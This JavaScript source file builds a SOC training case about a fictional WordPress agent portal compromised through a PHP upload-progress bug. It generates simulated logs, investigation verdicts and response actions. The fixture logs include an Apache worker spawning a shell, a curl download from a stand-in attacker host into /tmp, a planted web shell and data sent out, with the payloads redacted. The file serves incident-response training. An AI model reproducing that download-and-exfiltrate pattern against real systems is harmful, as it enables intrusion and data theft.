// Case file: PHP2Shell (CVE-2026-109618 and CVE-2026-109619), October 2026. A recreation of a NEW, real event, built from the
// public reporting listed in index.js. The victim (Halcyon Mutual) and everything that happens on its servers is fictional:
// as of Oct 25, 2026 (when this case was written) there were no publicly confirmed breaches.
//
// What is REAL (and why the logs look the way they do):
//   - Both bugs live in the PHP runtime and are reached with ordinary multipart (RFC 1867) POST requests before application
//     code runs. session.upload_progress is on by default (PHP 5.4+), so the string PHP_SESSION_UPLOAD_PROGRESS is the name of
//     a multipart field in the attempts. Amazon's honeypots saw it from Oct 17, four days before disclosure.
//   - The public detection advice (Wiz, Amazon, CrowdStrike via press): unusual multipart requests followed by memory-limit
//     fatals or repeated HTTP 500s; unexpectedly large or malformed PHPSESSID response cookies; unexplained worker restarts;
//     the only server-side trace may be "a single memory-limit fatal" in the web server error log; and PHP processes that
//     unexpectedly launch command shells or download files (FBI).
//   - The five addresses Amazon published for Oct 21 02:00-08:00 UTC, and the one from Oct 17, are real indicators. They are
//     shared anonymization infrastructure, so they appear here only as unsuccessful scans against the claims app.
//
// What is INVENTED (also in the disclaimer): Halcyon's hosts, versions, users, cookies, sizes and counts; the WAF rule and the
// WAF being in detection-only mode; the attacker 203.0.113.77 (a documentation address, RFC 5737); the memory disclosure that
// follows from it; the session reuse; the Apache child that spawns a shell at 10:21 AM on Oct 21; the web shell file name; the
// database read and the 14 MB that leave. No exploit payloads are shown: every request body and shell command is redacted.
//
// Times are US Eastern wall clock (EDT, UTC-4 on all of these dates). Day 0 is Wednesday Oct 21; the earlier days are negative.

import { T, logBuilder, finishDays } from '../../game/logkit.js';

export const DATE = { weekday: 'WED', name: 'Wednesday', month: 'Oct', day: 21, year: 2026, domain: 'halcyonmutual.local', netbios: 'HALCYON' };

const DAY = 86400;
const A = (day, h, m, s = 0) => day * DAY + T(h, m, s);
const EPOCH0 = Date.UTC(2026, 9, 21, 4, 0, 0) / 1000; // Oct 21 00:00 EDT

export const ATT = '203.0.113.77'; // invented attacker (documentation range)
const SCANNER = '45.95.147.236'; // the generic internet scanner used across the game
const PROBE = '198.51.100.99'; // plugin scanner (documentation range)
export const AMAZON_FIRST = '103.216.220.92'; // Amazon Threat Intelligence: earliest attempt, Oct 17 (commercial anonymization network)
export const AMAZON_IPS = ['31.223.184.166', '37.19.200.5', '134.209.159.64', '103.114.163.188', '95.217.98.37']; // Oct 21 02:00-08:00 UTC
const WEB = 'agentportal01';
const WEB_IP = '10.0.5.20';
const CLAIMS = 'claims-app01';
const CLAIMS_IP = '10.0.5.31';
const LEGACY = 'intranet02';
const LEGACY_IP = '10.0.6.14';
const DB = 'db01';
const SITE = 'agents.halcyonmutual.com';
const BROWSER = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36';
const PYREQ = 'python-requests/2.32.3';
const SCAN_UA = 'php2shell-scan/109618'; // seen by VulnCheck; used here only on the blocked scans
const SHELL_PATH = '/wp-content/uploads/2026/10/class-wp-cache-helper.php';
const REDACT = (n) => `[REDACTED-${n}-bytes]`;

export const IP_INFO = {
  [ATT]: { where: 'Unknown', owner: 'Anonymizing VPS service (stand-in)', note: 'The invented attacker in this replay. First multipart POSTs with PHP_SESSION_UPLOAD_PROGRESS on Oct 17, then a shell on Oct 21. A documentation address: real attackers rotate through shared infrastructure like the addresses in the Amazon post. (Stand-in IP.)', external: true },
  [AMAZON_FIRST]: { where: 'Unknown', owner: 'Commercial anonymization network (per Amazon)', note: 'Amazon Threat Intelligence listed this as the earliest exploitation attempt it saw (Oct 17), four days before disclosure. Shared anonymization infrastructure: other people use it too, so investigate what it did, do not just block it. Here it only hits the claims app and gets a 413.', external: true },
  '31.223.184.166': { where: 'Unknown', owner: 'Shared anonymization infrastructure (per Amazon)', note: 'One of five addresses in the Amazon post for Oct 21 02:00-08:00 UTC. Shared infrastructure: investigate, do not just block. Here: blocked by the claims app size limit.', external: true },
  '37.19.200.5': { where: 'Unknown', owner: 'Shared anonymization infrastructure (per Amazon)', note: 'One of five addresses in the Amazon post for Oct 21 02:00-08:00 UTC. Shared infrastructure: investigate, do not just block.', external: true },
  '134.209.159.64': { where: 'Unknown', owner: 'Shared anonymization infrastructure (per Amazon)', note: 'One of five addresses in the Amazon post for Oct 21 02:00-08:00 UTC. Shared infrastructure: investigate, do not just block.', external: true },
  '103.114.163.188': { where: 'Unknown', owner: 'Shared anonymization infrastructure (per Amazon)', note: 'One of five addresses in the Amazon post for Oct 21 02:00-08:00 UTC. Shared infrastructure: investigate, do not just block.', external: true },
  '95.217.98.37': { where: 'Unknown', owner: 'Shared anonymization infrastructure (per Amazon)', note: 'One of five addresses in the Amazon post for Oct 21 02:00-08:00 UTC. Shared infrastructure: investigate, do not just block.', external: true },
  [SCANNER]: { where: 'Netherlands', owner: 'AS49870 Alsycon B.V.', note: 'Mass internet scanner. Hammers every login page it finds with stolen passwords. Noise, not this breach.', external: true },
  [PROBE]: { where: 'Unknown', owner: 'Rented VPS (hosting provider)', note: 'Scans WordPress plugin readme files, looking for old plugins. Always 404 here. (Stand-in IP.)', external: true },
  '192.0.2.140': { where: 'Ohio, United States', owner: 'Residential ISP', note: 'An independent agent in Dayton. Her session is the one that was later reused from the attacker address. (Stand-in IP.)', external: true },
  [WEB_IP]: { where: 'Internal: DMZ', owner: `${WEB} (agent portal)`, note: 'WordPress on Apache with mod_php, PHP 8.2.34. Internet-facing behind the WAF. This is the server in the case.' },
  [CLAIMS_IP]: { where: 'Internal: DMZ', owner: `${CLAIMS} (claims intake)`, note: 'Laravel on nginx with PHP-FPM 8.3.35. Request body limit 8 MB.' },
  [LEGACY_IP]: { where: 'Internal: servers', owner: `${LEGACY} (old intranet app)`, note: 'PHP 7.4.33, end of life. Published to field offices through a reverse proxy.' },
};

const pad = (n) => String(n).padStart(2, '0');
const WD = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'];
const MO = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'];
function wall(t) {
  const day = Math.floor(t / DAY);
  const sec = t - day * DAY;
  const d = new Date(Date.UTC(2026, 9, 21 + day));
  return { wd: WD[d.getUTCDay()], mon: MO[d.getUTCMonth()], dd: pad(d.getUTCDate()), hh: pad(Math.floor(sec / 3600)), mm: pad(Math.floor((sec % 3600) / 60)), ss: pad(sec % 60) };
}
const clf = (t) => {
  const w = wall(t);
  return `${w.dd}/${w.mon}/2026:${w.hh}:${w.mm}:${w.ss} -0400`;
};

export function generateLogs({ nowMinutes = 24 * 60 } = {}) {
  const b = logBuilder(2621);
  const { r, add, pick } = b;
  const j = (n) => Math.floor(r() * n);
  const uid = () => `ZPh${(1000000 + j(8999999)).toString(36)}${(j(46656) + 46656).toString(36)}`;

  // Apache access log (combined format plus Content-Type, Content-Length and request time, as a hardened LogFormat would).
  const access = (t, ip, method, path, status, bytes, ua, extra = {}, tail = '', host = WEB) => {
    const raw = `${ip} - - [${clf(t)}] "${method} ${path} HTTP/1.1" ${status} ${bytes} "-" "${ua}"${tail}`;
    return add(t, host, 'httpd', raw, { raw, ip, srcpath: '/var/log/apache2/access.log', ...extra });
  };
  const ct = (len) => ` ct="multipart/form-data" cl=${len} rt=${(0.2 + r() * 0.5).toFixed(3)}`;
  const rt = () => ` rt=${(0.02 + r() * 0.3).toFixed(3)}`;
  // nginx access on the claims app.
  const nginx = (t, ip, method, path, status, bytes, ua, extra = {}) => {
    const raw = `${ip} - - [${clf(t)}] "${method} ${path} HTTP/1.1" ${status} ${bytes} "-" "${ua}"`;
    return add(t, CLAIMS, 'nginx', `nginx: ${raw}`, { ip, access: raw, ...extra });
  };
  // Apache error log (Apache 2.4 format).
  const errLog = (t, host, text, extra = {}) => {
    const w = wall(t);
    const raw = `[${w.wd} ${w.mon} ${w.dd} ${w.hh}:${w.mm}:${w.ss}.${100000 + j(899999)} 2026] ${text}`;
    return add(t, host, 'httpd-error', raw, { raw, srcpath: '/var/log/apache2/error.log', ...extra });
  };
  const audit = (t, line, extra = {}) => add(t, WEB, 'auditd', line, extra);
  const execve = (t, seq, comm, exe, argv, { ppid, pid, ...extra } = {}) => {
    const stamp = `${EPOCH0 + t}.${100 + j(800)}`;
    audit(t, `type=SYSCALL msg=audit(${stamp}:${seq}): arch=c000003e syscall=59 success=yes exit=0 ppid=${ppid} pid=${pid} auid=4294967295 uid=33 gid=33 euid=33 comm="${comm}" exe="${exe}" key="exec"`, extra);
    audit(t, `type=EXECVE msg=audit(${stamp}:${seq}): argc=${argv.length} ${argv.map((a, i) => `a${i}="${a}"`).join(' ')}`, extra);
  };
  const seen = {};
  const once = (name) => (seen[name] ? undefined : ((seen[name] = true), name));

  // ---------------- background: what a normal week looks like ----------------
  const agentIps = Array.from({ length: 14 }, (_, i) => `192.0.2.${20 + i * 11}`);
  const pages = [['GET', '/'], ['GET', '/agent-login/'], ['POST', '/wp-login.php'], ['GET', '/agent/quotes/'], ['GET', '/agent/policies/'], ['GET', '/wp-content/themes/halcyon/style.css'], ['POST', '/wp-admin/admin-ajax.php'], ['GET', '/agent/commissions/']];
  const END = A(0, 12, 0);
  for (let t = A(-4, 0, 5); t < END; t += (Math.floor(t / DAY) <= -3 ? 600 + j(900) : 200 + j(400))) {
    const ip = pick(agentIps);
    const [m, p] = pick(pages);
    access(t, ip, m, p, p === '/wp-login.php' ? 302 : 200, 400 + j(9000), BROWSER, {}, rt());
    if (r() < 0.12) add(t + 2, WEB, 'portal-auth', `login ok agent=A-${20000 + j(900)} src=${ip} method=password+mfa`, { ip, noise: true });
  }
  // Decoy: agents upload claim documents with multipart forms. Big, legitimate, answered 200 from known networks.
  for (let d = -4; d <= 0; d++) {
    for (let i = 0; i < 3; i++) {
      const t = A(d, 10 + i * 2, 5 + j(50), j(60));
      if (t > END) continue;
      const len = 12000000 + j(28000000);
      access(t, pick(agentIps), 'POST', '/agent/docs/upload/', 200, 1800, BROWSER, { key: d === -1 && i === 0 ? 'decoy-upload' : undefined }, ct(len));
    }
  }
  // Decoy: a real plugin bug makes Apache answer 500 (a different PHP fatal, nothing to do with memory).
  access(A(-2, 10, 17, 33), pick(agentIps), 'POST', '/agent/forms/submit/', 500, 527, BROWSER, { key: 'decoy-500' }, rt());
  errLog(A(-2, 10, 17, 33), WEB, `[php:error] [pid 14003] [client 192.0.2.64:50211] PHP Fatal error:  Uncaught Error: Call to undefined function agent_forms_save() in /var/www/html/wp-content/plugins/agent-forms/forms.php:218`, { key: 'decoy-500-err', noise: true });
  // Decoy: credential stuffing against the agent login (failed logins return 200 with the form again).
  for (let t = A(-4, 1, 0); t < END; t += 1100 + j(1500)) {
    access(t, SCANNER, 'POST', '/wp-login.php', 200, 3620, BROWSER, { noise: true, key: Math.floor(t / DAY) === -3 ? once('decoy-stuffing') : undefined }, rt());
  }
  // Decoy: a plugin scanner reads readme files and gets 404.
  for (let i = 0; i < 14; i++) {
    access(A(-3 + (i % 4), 4 + (i % 9), 5 + i * 3), PROBE, 'GET', `/wp-content/plugins/${pick(['akismet', 'elementor', 'contact-form-7', 'wp-file-manager', 'duplicator', 'ninja-forms'])}/readme.txt`, 404, 273, 'Mozilla/5.0 (compatible; Scan/1.0)', { noise: true }, rt());
  }
  // Decoys: the weekly authenticated scan and a WordPress core auto-update.
  add(A(-3, 3, 0), WEB, 'scanner', 'qualys-scan: authenticated scan of agentportal01 completed (job #90412). PHP 8.2.34 (one release behind current at the time). 0 criticals, 1 high (outdated plugin).', { noise: true, key: 'decoy-scan' });
  add(A(-2, 4, 30), WEB, 'app-log', 'wordpress: core auto-update 6.8.2 -> 6.8.3 completed. 0 errors.', { noise: true });
  // Claims intake: normal traffic.
  const cpaths = [['GET', '/'], ['GET', '/claims/new'], ['POST', '/claims'], ['GET', '/claims/status'], ['GET', '/build/app.js']];
  for (let t = A(-4, 6, 0); t < END; t += 500 + j(700)) {
    const [m, p] = pick(cpaths);
    nginx(t, pick(agentIps), m, p, m === 'POST' ? 302 : 200, 500 + j(7000), BROWSER, {});
  }
  // The old intranet app: staff, field offices, a few requests a day.
  for (let t = A(-4, 7, 0); t < END; t += 4000 + j(5000)) {
    access(t, pick(['10.20.4.17', '10.20.4.33', '10.20.4.40', '192.0.2.201']), 'GET', pick(['/', '/directory.php', '/forms/leave.php', '/news.php']), 200, 800 + j(6000), BROWSER, {}, rt(), LEGACY);
  }

  // ---------------- the attempts: what Amazon's honeypots also saw, now on Halcyon's agent portal ----------------
  // One attempt = the WAF notes a multipart POST with PHP_SESSION_UPLOAD_PROGRESS, Apache answers 500, PHP logs a memory-limit
  // fatal, a worker sometimes dies; a follow-up request sometimes gets a huge PHPSESSID cookie back.
  const attempt = (t, { ip = ATT, host = WEB, uri = '/wp-login.php', leak = false, segv = false } = {}) => {
    const len = pick([536870912, 805306368, 1073741824]);
    const pid = 14000 + j(900);
    add(t, 'waf01', 'modsec', `ModSecurity: Warning. Multipart request with a huge body sent to a page that takes no uploads (detection only) [id "9900101"] [data "part name: PHP_SESSION_UPLOAD_PROGRESS; content-length: ${len}"] [severity "NOTICE"] [hostname "${SITE}"] [uri "${uri}"] [unique_id "${uid()}"] src=${ip}`, { ip, attack: true, key: once('multipart-first') });
    access(t + 1, ip, 'POST', uri, 500, 527, PYREQ, { ip, attack: true, key: once('first-500') }, ct(len), host);
    errLog(t + 1, host, `[php:error] [pid ${pid}] [client ${ip}:${40000 + j(20000)}] PHP Fatal error:  Allowed memory size of 134217728 bytes exhausted (tried to allocate ${len + 8} bytes) in Unknown on line 0`, { ip, attack: true, key: once('oom-first') });
    if (segv) errLog(t + 2, host, `[core:notice] [pid 1021] AH00052: child pid ${pid} exit signal Segmentation fault (11)`, { attack: true, key: once('worker-segv') });
    if (leak) {
      const n = 2800 + j(1200);
      access(t + 6, ip, 'POST', uri, 200, 15200 + j(900), PYREQ, { ip, attack: true }, ct(Math.floor(len / 8)), host);
      add(t + 6, 'waf01', 'waf', `response-inspect host=${SITE} uri=${uri} status=200 set-cookie="PHPSESSID=[REDACTED-${n}-chars-of-url-encoded-data]" cookie_len=${n} expected_len=26-32 action=LOG-ONLY src=${ip}`, { ip, attack: true, key: once('cookie-leak') });
    }
  };
  // Oct 17 (Saturday): the first burst, early morning. Four days before the fix is public.
  for (let i = 0; i < 12; i++) attempt(A(-4, 3, 12, 4) + i * 34, { leak: i % 4 === 3, segv: i % 3 === 0 });
  nginx(A(-4, 4, 55, 12), AMAZON_FIRST, 'POST', '/index.php', 413, 183, SCAN_UA, { ip: AMAZON_FIRST, attack: true, key: 'scan-blocked' });
  // Oct 18 and 19: smaller, and the same pattern.
  for (let i = 0; i < 4; i++) attempt(A(-3, 2, 55, 20) + i * 41, { leak: i === 2, segv: i === 1 });
  for (let i = 0; i < 5; i++) attempt(A(-2, 3, 8, 10) + i * 38, { leak: i % 2 === 1, segv: i === 0 });
  // Oct 19, 2:52 PM: a session issued to an agent in Dayton is used from the attacker address.
  add(A(-2, 14, 52, 7), WEB, 'portal-auth', `session resumed agent=A-20417 session=s_8a4f0c.. issued_to=192.0.2.140 (Chrome, 12:41 PM) now_used_from=${ATT} ua="${PYREQ}" (one session, two networks, new user agent)`, { ip: ATT, attack: true, key: 'session-reuse' });
  // Oct 20 (Tuesday): details leak, a proof-of-concept video appears about 4 PM Eastern, and the volume goes up.
  for (let i = 0; i < 9; i++) attempt(A(-1, 16, 41, 3) + i * 29, { leak: i === 4 || i === 8, segv: i % 3 === 1 });
  // The old PHP 7.4 box was probed too.
  for (let i = 0; i < 2; i++) {
    const t = A(-1, 23, 41, 10) + i * 52;
    access(t, ATT, 'POST', '/index.php', 500, 527, PYREQ, { ip: ATT, attack: true }, ct(805306368), LEGACY);
    errLog(t, LEGACY, `[php7:error] [pid ${3300 + j(80)}] [client ${ATT}:${40000 + j(20000)}] PHP Fatal error:  Allowed memory size of 134217728 bytes exhausted (tried to allocate 805306376 bytes) in Unknown on line 0`, { ip: ATT, attack: true, key: i === 0 ? 'legacy-oom' : undefined });
  }
  // Oct 20 22:00 to Oct 21 04:00 Eastern = 02:00-08:00 UTC: the Amazon addresses scan, and the claims app's 8 MB limit answers 413.
  [A(-1, 22, 4, 12), A(-1, 23, 17, 40), A(0, 0, 52, 3), A(0, 1, 38, 29), A(0, 2, 41, 55), A(0, 3, 55, 8)].forEach((t, i) => {
    nginx(t, AMAZON_IPS[i % AMAZON_IPS.length], 'POST', '/index.php', 413, 183, SCAN_UA, { ip: AMAZON_IPS[i % AMAZON_IPS.length], attack: true, key: i === 0 ? 'scan-blocked-2' : undefined });
  });
  // Oct 21, 4:20 AM: a few more on the agent portal.
  for (let i = 0; i < 3; i++) attempt(A(0, 4, 20, 14) + i * 36, { leak: i === 1, segv: i === 2 });

  // ---------------- Wednesday 10:21 AM: the fix is 21 minutes old, a request makes an Apache child run commands ----------------
  const t0 = A(0, 10, 21, 40);
  add(t0, 'waf01', 'modsec', `ModSecurity: Warning. Multipart request with a huge body sent to a page that takes no uploads (detection only) [id "9900101"] [data "part name: PHP_SESSION_UPLOAD_PROGRESS; content-length: 1073741824"] [severity "NOTICE"] [hostname "${SITE}"] [uri "/wp-login.php"] [unique_id "${uid()}"] src=${ATT}`, { ip: ATT, attack: true, key: 'rce-req' });
  access(t0 + 1, ATT, 'POST', '/wp-login.php', 500, 527, PYREQ, { ip: ATT, attack: true }, ct(1073741824));
  errLog(t0 + 1, WEB, `[php:error] [pid 14877] [client ${ATT}:51822] PHP Fatal error:  Allowed memory size of 134217728 bytes exhausted (tried to allocate 1073741832 bytes) in Unknown on line 0`, { ip: ATT, attack: true, key: 'rce-oom' });
  access(t0 + 4, ATT, 'POST', '/wp-login.php', 200, 3977, PYREQ, { ip: ATT, attack: true }, ct(134217728));
  // The Apache child (www-data) starts a shell, which starts curl. Command lines are redacted.
  execve(t0 + 6, 5301, 'sh', '/usr/bin/dash', ['sh', '-c', REDACT(58)], { attack: true, ppid: 14877, pid: 15310 });
  add(t0 + 6, WEB, 'edr', `process_create user=www-data parent=/usr/sbin/apache2 parent_pid=14877 image=/usr/bin/dash pid=15310 cmdline="sh -c ${REDACT(58)}" note="a web server worker started a shell"`, { attack: true, ip: ATT, key: 'apache-sh' });
  execve(t0 + 8, 5302, 'curl', '/usr/bin/curl', ['curl', '-s', '-o', '/tmp/.c-8f3a', `http://${ATT}/${REDACT(12)}`], { attack: true, ppid: 15310, pid: 15311 });
  add(t0 + 8, WEB, 'edr', `process_create user=www-data parent=/usr/bin/dash parent_pid=15310 image=/usr/bin/curl pid=15311 cmdline="curl -s -o /tmp/.c-8f3a http://${ATT}/${REDACT(12)}" note="a download into /tmp from an unknown address"`, { attack: true, ip: ATT, key: 'curl-tmp' });
  add(t0 + 9, 'fw01', 'firewall', `ALLOW out src=${WEB_IP} dst=${ATT} dport=80 proto=tcp app=http bytes=18432 note="agentportal01 should not initiate outbound to the internet"`, { attack: true, ip: ATT, key: 'egress-dl' });
  audit(t0 + 13, `type=PATH msg=audit(${EPOCH0 + t0 + 13}.402:5306): item=1 name="/var/www/html${SHELL_PATH}" nametype=CREATE mode=0100644 ouid=33 ogid=33`, { attack: true, ip: ATT, key: 'webshell-write' });
  add(t0 + 14, WEB, 'app-log', `file-integrity: NEW file /var/www/html${SHELL_PATH} (php, unsigned, in uploads; not from any plugin, theme or release). Writer: www-data.`, { attack: true, ip: ATT, key: 'webshell-new' });
  access(t0 + 75, ATT, 'GET', `${SHELL_PATH}?x=${REDACT(16)}`, 200, 612, PYREQ, { ip: ATT, attack: true, key: 'shell-use' }, rt());
  access(t0 + 96, ATT, 'GET', `${SHELL_PATH}?x=${REDACT(24)}`, 200, 4870, PYREQ, { ip: ATT, attack: true }, rt());
  audit(t0 + 97, `type=PATH msg=audit(${EPOCH0 + t0 + 97}.118:5340): item=0 name="/var/www/html/wp-config.php" nametype=NORMAL mode=0100640 ouid=33 ogid=33 key="wp-secrets"`, { attack: true, ip: ATT, key: 'read-wpconfig' });
  add(t0 + 140, DB, 'dbaudit', `user=wp_agentportal client=${WEB_IP} db=agentportal op=SELECT table=agent_contacts rows=48211 duration=3.9s note="usual for this account: under 60 rows per query"`, { attack: true, ip: ATT, key: 'db-select' });
  access(t0 + 150, ATT, 'GET', `${SHELL_PATH}?x=${REDACT(20)}`, 200, 14876672, PYREQ, { ip: ATT, attack: true }, rt());
  add(t0 + 152, 'fw01', 'firewall', `ALLOW out src=${WEB_IP} dst=${ATT} dport=443 proto=tcp app=ssl bytes=14876672 note="agentportal01 should not initiate outbound to the internet"`, { attack: true, ip: ATT, key: 'exfil' });
  add(t0 + 153, WEB, 'netflow', `flow src=${WEB_IP} dst=${ATT}:443 proto=tcp state=ACCEPT duration=94 bytes_out=14876672 bytes_in=2210`, { attack: true, ip: ATT });

  return finishDays(b.ev, { nowMinutes, date: DATE });
}

export const CASE = {
  id: 'case',
  area: 'SOC investigation',
  title: 'Was the agent portal hit by PHP2Shell, and since when?',
  max: 40,
  question: 'What happened to the agent portal?',
  teaches: { skill: 'Hunt a new web-runtime vulnerability from its first exploitation date, find the web shell and decide what a patch will not fix', secplus: '4.9 Use data sources: web and OS logs; 4.8 Incident response' },
  verdicts: [
    { id: 'php2shell', text: 'PHP2Shell exploitation of the agent portal. Multipart POSTs with PHP_SESSION_UPLOAD_PROGRESS since Oct 17 caused memory-limit fatals, 500s, dead workers and oversized PHPSESSID cookies (leaked memory). On Oct 21, after the fix was released, a request made an Apache worker run a shell and curl, and a web shell was written to wp-content/uploads. Patching alone will not remove it, and the secrets that could have leaked must be rotated.' },
    { id: 'scan', text: 'Routine internet scanning for the new PHP bug. The 500s and 413s are background noise, and nothing got in.' },
    { id: 'plugin', text: 'A bug in a WordPress plugin on the agent portal was exploited. The 500s are the plugin crashing.' },
    { id: 'stuffing', text: 'Credential stuffing: someone logged in with an agent\'s stolen password, then uploaded files.' },
  ],
  correctVerdict: 'php2shell',
  wrongVerdictNotes: {
    scan: 'The scanners (the Amazon-listed addresses and the stuffing noise) were stopped: the claims app answered 413 and the login page gave 200 with the form. What hit the agent portal came from 203.0.113.77, started on Oct 17, produced memory-limit fatals and a huge PHPSESSID cookie, and ended with a worker running /bin/sh and curl and a new PHP file in uploads. Nothing like that is background noise.',
    plugin: 'The plugin crash is a single, unrelated PHP fatal ("Call to undefined function") from a known agent. The memory-limit fatals ("Allowed memory size ... exhausted in Unknown on line 0") come with multipart POSTs from 203.0.113.77, before any application code runs, and they started four days earlier. A plugin bug does not make Apache run /bin/sh.',
    stuffing: 'The stuffing noise is failed logins on /wp-login.php that return 200 and the login form again. The one reused session is a symptom of the memory leak, not a password guess, and the real damage is Apache starting a shell and a new PHP file. Passwords were not what got in.',
  },
  actions: [
    { id: 'isolate', text: 'Take the agent portal off the internet (a maintenance page), keep agentportal01 powered on, and snapshot the disk and memory and copy the Apache, WAF and audit logs first', good: true },
    { id: 'hunt', text: 'Hunt from at least Oct 17, not the disclosure date, on every PHP host: PHP_SESSION_UPLOAD_PROGRESS, "Allowed memory size" fatals, bursts of 500s, oversized PHPSESSID cookies, dead workers, Apache or PHP-FPM children that start shells or curl, and new .php files', good: true },
    { id: 'rebuild', text: 'Rebuild agentportal01 from a clean image and install a fixed PHP (8.2.35 or later, or a vendor build whose changelog names the CVEs), then redeploy WordPress from known-good sources', good: true },
    { id: 'rotate', text: 'Rotate what the memory leak and the shell could reach: the database password, the WordPress salts and keys, API tokens and any other secrets in wp-config, and invalidate every agent session', good: true },
    { id: 'inventory', text: 'Inventory every PHP host and SAPI (including claims-app01, the end-of-life PHP 7.4 intranet box and vendor or marketing sites), patch each, and take PHP 7.4 off the internet until it is upgraded', good: true },
    { id: 'mitigate', text: 'On hosts you cannot patch yet, apply php.net\'s partial mitigations (session.upload_progress.enabled=0 in php.ini and a low post_max_size and request-size limits at the proxy) and restart every worker, knowing this is not a complete fix', good: true },
    { id: 'comms', text: 'Tell agents and leadership the facts: what you know, what you do not, what to do (use phone support, watch for fake password-reset emails), and when the next update comes. Do not say "we are fine"', good: true },
    { id: 'patchonly', text: 'Install PHP 8.2.35, restart Apache and reopen the portal. The bug is fixed, so we are done', good: false, why: 'The patch closes the bug, not the web shell, the stolen database contents or the secrets that could have leaked from memory since Oct 17. A restart also throws away the evidence in memory and in /tmp.' },
    { id: 'deleteshell', text: 'Delete class-wp-cache-helper.php and the file in /tmp and move on', good: false, why: 'That destroys the evidence of what was read and sent, and one deleted file says nothing about what else was changed or which secrets left. Contain first, image, hunt, rebuild.' },
    { id: 'hideversion', text: 'Set expose_php=Off on every host and mark the issue mitigated', good: false, why: 'That hides the version header and nothing else. Most exposed PHP hosts already hide it (about four in five on the VirusTotal count) and they are still vulnerable. It is not a mitigation.' },
    { id: 'blockips', text: 'Block the six addresses in the Amazon post and 203.0.113.77 at the firewall and close the case', good: false, why: 'The Amazon addresses are shared anonymization infrastructure, so the same people can come back from another one. Blocking is fine as a small extra step, but it contains nothing: the shell is already on disk and the secrets are already out.' },
  ],
  primaryEvidence: { key: 'multipart-first', note: 'The key line: on Saturday Oct 17 at 03:12 the WAF logged a huge multipart POST with a field named PHP_SESSION_UPLOAD_PROGRESS to /wp-login.php, a page that takes no uploads. That is four days before the fix was public. A hunt that starts at the disclosure date never finds it.' },
  keyEvidence: ['multipart-first', 'oom-first', 'cookie-leak', 'session-reuse', 'rce-oom', 'apache-sh', 'curl-tmp', 'webshell-new', 'shell-use', 'read-wpconfig', 'db-select', 'exfil'],
  containedRequires: ['isolate', 'hunt'],
  costs: {
    contained: { amount: 480000, text: 'Forensics, a rebuilt portal, resetting every agent session and secret, notices to the agents whose contact data was read, and a day of portal downtime (estimate for this replay)' },
    breach: { amount: 4200000, text: 'The shell stays live, the database and secrets stay in the attacker\'s hands, more data leaves, and notices, regulators and agent trust follow (estimate for this replay)' },
  },
  perfectWhy: 'That is the right order for a new runtime bug: know every PHP host, hunt from the first exploitation date and not the disclosure date, contain without destroying evidence, patch by rebuilding, then rotate what could have leaked and tell people the truth. A patch fixes the door, not the intruder.',
  notSubmittedWhy: 'Nobody wrote it up. The web shell stayed on the agent portal and the leaked secrets stayed valid.',
};

export const ALERTS = [
  {
    id: 'php-worker-shell',
    main: true,
    title: 'Apache worker on agentportal01 started /bin/sh and curl; new PHP file in wp-content/uploads',
    severity: 'Critical',
    rule: 'EDR: a web server process (apache2, php-fpm) starts a shell or a downloader. File integrity: a new .php file under uploads. Both fired within 10 seconds.',
    fields: [
      ['Host', 'agentportal01 (WordPress, Apache mod_php, PHP 8.2.34)'],
      ['Process', 'apache2 (www-data) -> /usr/bin/dash -> /usr/bin/curl, download into /tmp'],
      ['New file', '/var/www/html/wp-content/uploads/2026/10/class-wp-cache-helper.php'],
      ['First seen', 'Oct 21, 10:21 AM'],
    ],
    trigger: { when: (st, min) => min >= 10 * 60 + 32 },
    notice: '\u{1F6A8} SIEM alert (Critical): an Apache worker started a shell on agentportal01',
    chat: [
      'That is PHP2Shell on our own server: a web worker started a shell and a download, and a PHP file nobody deployed is in uploads. The fix came out at 10:00 and it is already being used on us.',
      'Do not assume the story starts at 10:21. Amazon saw the first attempts on Oct 17. Hunt back to then.',
      'Open the Terminal. The agent portal export is at /mnt/agentportal and the host inventory is at /mnt/inventory. grep for PHP_SESSION_UPLOAD_PROGRESS and "Allowed memory size".',
      'Then an agent support lead will call. After that, badge into the server room and work the case.',
    ],
    case: CASE,
  },
];

// Numbers the digest email quotes, computed from the same logs so they cannot drift.
function stats() {
  const logs = generateLogs({ nowMinutes: A(0, 10, 0) / 60 });
  const upTo = (n) => logs.filter((e) => e.source === 'modsec' && e.msg.includes('PHP_SESSION_UPLOAD_PROGRESS') && e.abs < A(0, 0, 0) + n);
  const waf = logs.filter((e) => e.source === 'modsec' && e.msg.includes('PHP_SESSION_UPLOAD_PROGRESS'));
  const oom = logs.filter((e) => e.source === 'httpd-error' && e.host === WEB && e.msg.includes('Allowed memory size') && e.attack);
  const byDay = {};
  for (const e of waf) byDay[e.time.split(' ').slice(0, 2).join(' ')] = (byDay[e.time.split(' ').slice(0, 2).join(' ')] || 0) + 1;
  return { warnings: waf.length, preDisclosure: upTo(0).length, oom: oom.length, byDay };
}
export const STATS = stats();
